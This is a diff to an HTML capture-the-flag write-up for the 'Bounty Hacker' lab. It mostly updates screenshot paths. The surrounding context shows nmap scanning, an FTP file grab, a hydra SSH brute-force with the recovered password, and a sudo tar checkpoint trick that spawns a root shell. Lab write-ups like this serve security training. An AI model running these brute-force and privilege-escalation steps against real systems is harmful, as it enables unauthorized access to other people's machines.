@@ -144,7 +144,7 @@
 
       <pre><code>nmap -sV -sS -sC 10.10.16.96 -oA bounty_hacker</code></pre>
 
-      <p>Screenshot (from notes):</p>
+      <p>From the website !:</p>
       <div class="img-wrap">
         <!-- Upload this file to /assets/cowboyhacker/ and keep the filename -->
         <img class="screenshot" src="assets/cowboyhacker.png" alt="nmap screenshot">
@@ -199,7 +199,7 @@ ftp> get task.txt
 </code></pre>
 
       <div class="img-wrap">
-        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024221033.png" alt="ftp listing screenshot">
+        <img class="screenshot" src="assets/wordlist.png" alt="ftp listing screenshot">
       </div>
 
       <p>Notes: <em>task.txt</em> contained <code>lin</code> (interpreted as a username) and <em>locks.txt</em> looked like a password wordlist — so I tried an SSH brute-force.</p>
@@ -211,7 +211,7 @@ ftp> get task.txt
       <pre><code>hydra -l lin -P locks.txt 10.10.16.96 ssh</code></pre>
 
       <div class="img-wrap">
-        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024221639.png" alt="hydra screenshot">
+        <img class="screenshot" src="assets/ssh.png" alt="hydra screenshot">
       </div>
 
       <p><strong>Result:</strong> Password found — <code>RedDr4gonSynd1cat3</code></p>
@@ -244,7 +244,7 @@ User lin may run the following commands on ip-10-16-96:
       <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
 
       <div class="img-wrap">
-        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024222900.png" alt="root shell via tar screenshot">
+        <img class="screenshot" src="assets/privesc.png" alt="root shell via tar screenshot">
       </div>
 
       <p>After that I changed directory to <code>/root</code> and listed files.</p>
@@ -258,7 +258,7 @@ root.txt  snap
 </code></pre>
 
       <div class="img-wrap">
-        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024223637.png" alt="root.txt screenshot">
+        <img class="screenshot" src="assets/done.png" alt="root.txt screenshot">
       </div>
 
       <p>Root flag located at <code>/root/root.txt</code>.</p>
